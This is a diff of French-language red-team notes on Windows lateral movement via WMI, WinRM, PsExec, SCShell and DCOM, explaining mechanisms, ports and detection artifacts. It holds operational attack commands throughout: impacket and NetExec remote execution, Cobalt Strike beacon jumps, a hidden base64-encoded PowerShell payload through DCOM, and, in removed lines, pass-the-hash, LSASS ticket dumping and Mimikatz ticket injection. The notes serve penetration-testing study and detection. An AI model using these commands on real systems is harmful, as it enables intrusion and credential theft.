@@ -1,30 +1,4 @@
-# WMI
-
-Exécute des processus à distance via `Win32_Process.Create`. Nécessite d'être membre du groupe **Administrators local** sur la cible (les domain users ne sont pas soumis aux restrictions UAC distantes).
-
-**nxc / impacket-wmiexec (depuis Kali)**
-
-```bash
-# nxc
-nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami"
-nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method wmiexec
-
-# impacket -  shell interactif
-impacket-wmiexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
-```
-
-Ports utilisés par `wmiexec` :
-- **135** (DCOM/RPC) -  exécution de la commande via WMI
-- **445** (SMB/ADMIN$) -  récupération de l'output (fichier temporaire sur le partage admin)
-
-Si seul le port **445** est disponible, utiliser `smbexec` -  crée un service temporaire via SCM, sans passer par WMI : 
-```bash
-nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
-```
-
-**PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`
-
-> Les processus WMI sont créés en **session 0** (isolation système) -  invisibles dans la session utilisateur active.
+> Rappel RPC : Le port 135 est l'Endpoint Mapper : le client s'y connecte pour demander sur quel port dynamique joindre le service cible. Dans Windows, une grande partie du RPC passe en réalité par des named pipes transportés sur SMB (port 445), ce qui explique pourquoi le 445 est omniprésent dans le trafic d'administration réseau.
 
 # WinRM
 
@@ -46,13 +20,52 @@ nxc winrm 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -X "whoami"
 
 > WinRM souffre du **Kerberos Double Hop** -  les credentials ne se propagent pas aux ressources réseau distantes depuis la session. Préférer WMI pour éviter ce problème.
 
+**Cobalt Strike**
+```
+beacon> jump winrm64 lon-ws-1 smb
+
+beacon> remote-exec winrm lon-ws-1 net sessions
+```
+
+---
 # PsExec
 
-Protocole : **SMB uniquement, port 445**. Nécessite admin local sur la cible + partage ADMIN$ accessible.
+## Mécanisme
 
-Fonctionnement : copie un binaire service (`PSEXESVC.exe`) sur ADMIN$, le démarre via le SCM (Service Control Manager), puis communique via un named pipe dédié.
+PsExec est un outil Sysinternals, mais en red team le terme désigne surtout le mécanisme SMB + SCM, réimplémenté par des outils comme Impacket, NetExec ou Cobalt Strike.
+
+PsExec embarque PSEXESVC.exe directement dans ses ressources binaires. À l'exécution, il extrait ce binaire et le copie sur la cible via le partage ADMIN$ (qui pointe vers C:\Windows), accessible uniquement aux admins locaux. Il se connecte ensuite au Service Control Manager (SCM) via RPC pour créer et démarrer un service. Ce service ouvre un named pipe pour la communication stdin/stdout, ce qui permet de recevoir l'output directement. À la fin, le service et le binaire sont supprimés.
+
+Les réimplémentations (Cobalt Strike, NetExec) reproduisent ce mécanisme mais avec un payload personnalisé à la place de PSEXESVC.exe, un nom de service aléatoire, et selon la configuration un chargement en mémoire sans toucher le disque.
 
 > Très bruyant : écrit sur le disque, crée un service -  détecté par presque tous les EDR. Préférer WMI pour la discrétion.
+## Workflow
+
+```
+Client
+  │
+  ├─[SMB 445]──► ADMIN$ → copie PSEXESVC.exe dans C:\Windows\
+  │
+  ├─[RPC 135]──► Endpoint Mapper → port dynamique SCM
+  │
+  ├─[RPC dyn]──► SCM → CreateService + StartService (PSEXESVC)
+  │
+  ├─[SMB 445]──► Named pipe → stdin/stdout ↔ commande exécutée
+  │
+  └─[RPC dyn]──► SCM → StopService + DeleteService + suppression binaire
+```
+## Ports / Protocoles
+
+- Port 445 (SMB) : copie du binaire via ADMIN$ et transport des named pipes
+- Port 135 (RPC Endpoint Mapper) : négociation du port dynamique pour le SCM
+- Port dynamique haut : communication effective avec le SCM
+## Artefacts
+
+- Binaire écrit sur le disque
+- Service créé dans le registre
+- Event ID 7045 (nouveau service installé)
+- Logs SMB et d'authentification
+## Commandes
 
 **impacket-psexec (depuis Kali)**
 
@@ -75,154 +88,151 @@ nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
 .\PsExec64.exe -i \\<HOSTNAME> -u corp\<USER> -p <PASSWORD> cmd
 ```
 
-# Pass the Hash (PtH)
-
-Authentification avec le hash NTLM directement, sans le mot de passe en clair. Fonctionne uniquement avec **NTLM** -  pas avec Kerberos.
-
-> Limitation : depuis le patch 2014, PtH ne fonctionne qu'avec le compte **Administrator local intégré** (RID 500) et les comptes de domaine. Les autres comptes admin locaux sont bloqués par défaut.
-
-**NetExec**
-
-```bash
-# SMB
-nxc smb 'IP' -u Administrator -H ''NTLM_HASH''
-
-# WinRM
-nxc winrm 'IP' -u Administrator -H ''NTLM_HASH''
-
-# RDP
-nxc rdp 'IP' -u Administrator -H ''NTLM_HASH''
-
-# LDAP
-nxc ldap 'IP' -u Administrator -H ''NTLM_HASH''
+**Cobalt Strike**
+```
+beacon> jump psexec64 lon-ws-1 smb
 ```
 
-**impacket**
+---
+# SCShell
 
-```bash
-# shell via WMI
-impacket-wmiexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
+## Mécanisme
 
-# shell via PsExec (crée un service)
-impacket-psexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
+[SCShell](https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF) est une variation de PsExec qui évite de créer un nouveau service. Au lieu de ça, il ouvre un service existant sur la cible via le SCM (dans l'exemple : defragsvc), récupère son chemin binaire original, le remplace temporairement par le payload, démarre le service pour exécuter le payload, puis restaure le chemin original. Aucun nouveau service n'est créé, aucun binaire n'est copié via ADMIN$.
 
-# smbclient
-impacket-smbclient -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
+`C:\Tools\SCShell\CS-BOF\scshell.cna
+## Workflow
+
+```
+Client
+  │
+  ├─[RPC 135]──► Endpoint Mapper → port dynamique SCM
+  │
+  ├─[RPC dyn]──► SCM → OpenService (service existant, ex: defragsvc)
+  │
+  ├─[RPC dyn]──► SCM → QueryServiceConfig → récupère le chemin original
+  │
+  ├─[RPC dyn]──► SCM → ChangeServiceConfig → remplace le binaire par le payload
+  │
+  ├─[RPC dyn]──► SCM → StartService → exécute le payload
+  │
+  ├─[RPC dyn]──► SCM → ChangeServiceConfig → restaure le chemin original
+  │
+  └─[SMB 445]──► Named pipe → lien établi avec le beacon enfant
+```
+## Ports / Protocoles
+
+- Port 135 (RPC Endpoint Mapper) : négociation du port dynamique pour le SCM
+- Port dynamique haut : communication avec le SCM (OpenService, ChangeServiceConfig, StartService)
+- Port 445 (SMB) : communication avec le beacon enfant via named pipe si listener SMB
+## Artefacts
+
+- Pas de nouveau service créé dans le registre
+- Pas de binaire copié via ADMIN$
+- Modification temporaire du chemin binaire d'un service existant (visible dans les logs de changement de configuration de service)
+- Logs d'authentification réseau et RPC/SCM
+
+## Commandes
+
+**Cobalt Strike**
+```
+beacon> jump scshell64 lon-ws-1 smb
 ```
 
-**evil-winrm**
+---
+# WMI
 
-```bash
-evil-winrm -i <IP_CIBLE> -u Administrator -H '<NTLM_HASH>'
+## Mécanisme
+
+WMI est un framework de gestion natif Windows. Le client établit une connexion DCOM/RPC vers la cible, s'authentifie, et obtient une interface COM vers le namespace root\cimv2. Il appelle ensuite Win32_Process.Create() pour spawner un processus directement sur la machine cible, exécuté par WmiPrvSE.exe.
+
+Il n'y a pas de canal de retour natif : l'output n'est pas renvoyé directement. Pour le récupérer, il faut rediriger la sortie vers un fichier puis le lire via SMB, ou utiliser d'autres techniques.
+
+## Workflow
+
 ```
+Client
+  │
+  ├─[RPC 135]──► Endpoint Mapper → port dynamique DCOM
+  │
+  ├─[RPC dyn]──► Authentification + interface COM root\cimv2
+  │
+  ├─[RPC dyn]──► Win32_Process.Create() → WmiPrvSE.exe spawne le processus
+  │
+  └─[SMB 445]──► (optionnel) lecture de l'output redirigé vers un fichier
+```
+## Ports / Protocoles
 
-# Overpass the Hash
+- Port 135 (RPC Endpoint Mapper) : premier contact pour obtenir le port dynamique du service DCOM
+- Port dynamique haut (1024-65535) : vraie communication DCOM/RPC
+- Port 445 (SMB) optionnel : si récupération de l'output via fichier partagé
 
-Convertit un **hash NTLM** en **TGT Kerberos**. Utile quand NTLM est bloqué, ou pour utiliser des outils Kerberos uniquement (PsExec Sysinternals original, etc.).
+## Artefacts
 
-> Le KDC délivre ensuite les TGS automatiquement à partir du TGT pour chaque service demandé.
+- Pas de binaire sur le disque
+- Pas de service créé
+- Processus spawné par WmiPrvSE.exe (IOC bien connu des EDR)
+- Logs dans Microsoft-Windows-WMI-Activity/Operational
+- Logs d'authentification réseau
 
-**Linux**
+## Commandes
 
-Obtenir le TGT
+**nxc / impacket-wmiexec (depuis Kali)**
 
 ```bash
-# impacket
-impacket-getTGT corp.com/'USER' -hashes :'NTLM_HASH' -dc-ip 'IP_DC'
-
 # nxc
-nxc smb 'IP_DC' -u 'USER' -H 'NTLM_HASH' --generate-tgt /tmp/'USER'.ccache
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami"
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method wmiexec
+
+# impacket -  shell interactif
+impacket-wmiexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 ```
 
-Utiliser le TGT
-
+Si seul le port **445** est disponible, utiliser `smbexec` -  crée un service temporaire via SCM, sans passer par WMI : 
 ```bash
-export KRB5CCNAME=/tmp/<USER>.ccache
-
-# impacket (-target-ip si le hostname ne résout pas sur Kali)
-impacket-psexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
-impacket-wmiexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
-impacket-smbclient -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
-impacket-secretsdump -k -no-pass corp.com/'USER'@'HOSTNAME_DC' -dc-ip 'IP_DC' -target-ip 'IP_DC'
-
-# nxc
-nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
 ```
 
-**Windows (Mimikatz)**
+**PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`
+
+> Les processus WMI sont créés en **session 0** (isolation système) -  invisibles dans la session utilisateur active.
+
+---
+# DCOM Exec
+
+## Mécanisme
+
+DCOM permet d'instancier et d'interagir avec des objets COM sur une machine distante. Le client instancie un objet COM distant via DCOM (ex: MMC20.Application) et appelle directement une méthode exposée par cet objet pour exécuter une commande (Document.ActiveView.ExecuteShellCommand). Aucun service n'est créé, aucun binaire n'est copié.
+
+Trois objets sont couramment utilisés : MMC20.Application, ShellWindows et ShellBrowserWindow. MMC20 est préférable en contexte serveur car il tourne en Session 0, indépendamment des sessions utilisateur interactives. ShellWindows et ShellBrowserWindow nécessitent explorer.exe actif sur la cible, ce qui les rend inutilisables sur la plupart des serveurs.
+
+Comme WMI, il n'y a pas de canal de retour natif pour l'output.
+## Workflow
 
 ```
-sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
+Client
+  │
+  ├─[RPC 135]──► Endpoint Mapper → port dynamique DCOM
+  │
+  ├─[RPC dyn]──► Instanciation de l'objet COM distant (ex: MMC20.Application)
+  │
+  ├─[RPC dyn]──► Appel de méthode → Document.ActiveView.ExecuteShellCommand()
+  │
+  └─[SMB 445]──► (optionnel) lecture de l'output redirigé vers un fichier
 ```
+## Ports / Protocoles
 
-Spawne un PowerShell. Déclencher un AS-REQ pour générer le TGT en mémoire :
+- Port 135 (RPC Endpoint Mapper) : premier contact pour négocier le port dynamique DCOM
+- Port dynamique haut (1024-65535) : instanciation de l'objet COM et appel de méthode
+- Port 445 (SMB) optionnel : si récupération de l'output via fichier partagé
+## Artefacts
 
-```powershell
-net use \\<HOSTNAME>   # force l'obtention du TGT
-klist                  # vérifier
-.\PsExec.exe \\<HOSTNAME> cmd
-```
+- Pas de binaire sur le disque
+- Pas de service créé
+- Processus spawné par mmc.exe ou explorer.exe selon l'objet utilisé
+- Logs DCOM dans le journal Système (erreurs) et logs d'authentification réseau
 
-**Lire la sortie de `klist`**
-
-| Champ | TGT | TGS |
-|---|---|---|
-| `Server` | `krbtgt/CORP.COM` | `cifs/files04`, `http/web04`… |
-| `Ticket Flags` | contient `initial` | pas de flag `initial` |
-| Obtenu via | AS-REQ (1ère étape) | TGS-REQ (échange du TGT) |
-
-> `forwardable` = le ticket peut être transmis à un autre service (attention en contexte de délégation Kerberos non contrainte).
-
-# Pass the Ticket (PtT)
-
-Voler un TGT ou TGS depuis la mémoire LSASS d'une machine et l'utiliser dans une autre session. Contrairement à PtH et Overpass the Hash, on réutilise un **ticket déjà émis** -  utile quand on n'a pas le hash du compte cible.
-
-> Le TGT est réutilisable pour n'importe quel service pendant ~10h. Le TGS est limité au service pour lequel il a été émis.
-
-**Linux (nxc + lsassy)**
-
-1. Extraire les tickets de LSASS à distance
-```bash
-nxc smb 'IP_CIBLE' -u 'USER' -H 'NTLM_HASH' -M lsassy
-```
-
-2. Choisir et charger le ticket
-```bash
-ls -l ~/.nxc/modules/lsassy/
-# Format des fichiers : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache
-
-# TGS_CORP.COM_dave_cifs_web04_[...].ccache  → accès SMB à web04
-# TGS_CORP.COM_dave_ldap_dc1_[...].ccache   → accès LDAP au DC
-# TGT_CORP.COM_dave_krbtgt_[...].ccache     → TGT réutilisable pour tout service
-
-export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TG[...].ccache'
-```
-
-3. Utiliser le ticket
-```bash
-nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
-```
-
-**Windows (Mimikatz)**
-
-```
-# 1. Exporter tous les tickets en .kirbi
-privilege::debug
-sekurlsa::tickets /export
-
-# 2. Injecter le ticket choisi
-kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-
-# 3. Vérifier et utiliser
-klist
-ls \\web04\backup
-```
-
-# DCOM
-
-Exécution distante via les objets COM/DCOM. Utilise RPC sur le port **135**. Nécessite admin local sur la cible.
-
-Objet utilisé : **MMC20.Application** → méthode `Document.ActiveView.ExecuteShellCommand`
+## Commandes
 
 **Kali (impacket-dcomexec)**
 
@@ -246,4 +256,3 @@ $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Appl
 # Exécuter une commande
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
 ```
-
